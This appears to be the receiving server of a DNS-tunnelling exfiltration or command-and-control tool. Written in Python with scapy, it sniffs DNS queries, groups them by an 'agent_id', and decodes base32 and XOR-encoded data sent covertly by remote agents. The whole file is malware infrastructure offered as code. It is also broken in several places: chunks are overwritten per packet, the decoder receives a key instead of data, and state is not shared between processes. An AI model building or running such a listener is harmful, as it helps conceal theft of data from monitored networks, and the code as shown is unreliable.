#!/bin/python3
from multiprocessing import Process
from pprint import pprint
from scapy.all import *
import os, random, sys, configparser, re, threading, string, time, base64, ast, json

chunks = {}

def server_capture():
	sniff(filter = 'dst port 53', prn=server_parse, store=0)

def server_parse(pkt):
	print(pkt)
	if DNS in pkt:	
		agent_id = pkt[DNS].id
		chunks[agent_id] = []
		chunks[agent_id].append(pkt[DNS].qd)

def stats_decode(chunks):
	count = 0
	key = chunks[0][:1]
	combined_chunks = ''.join(chunks)[1:]
	decoded_stats = None
	for c in reversed(combined_chunks):
		if c == '0':
			count += 1
		elif c == '9':
			count += 1
			break
		else:
			break
	unpadded = combined_chunks[:len(combined_chunks)-count].upper()
	count = 0
	while decoded_stats is None:
		attempt = unpadded + ''.join([ '=' for _ in range(count)])
		print(attempt)
		try:
			decoded_stats = base64.b32decode(attempt.encode()).decode()
		except:
			count += 1
			pass
	print(decoded_stats)
	finished_stats = ast.literal_eval(''.join([ chr(i ^ ord(key)) for i in ast.literal_eval(decoded_stats) ]))
	print(finished_stats)
	print(type(finished_stats))

	# walk back from last chunk, 0s for padding until first non-0, unless 9, then include 9 in padding
	
def main():
	while True:
		for host in chunks:
			print(chunks.keys())
			print(host)
			try:
				stats_decode(host)
			except:
				continue
		time.sleep(10)

if __name__ == "__main__":
	process1 = Process(target=server_capture)
	process2 = Process(target=main)
	process1.start()
	process2.start()
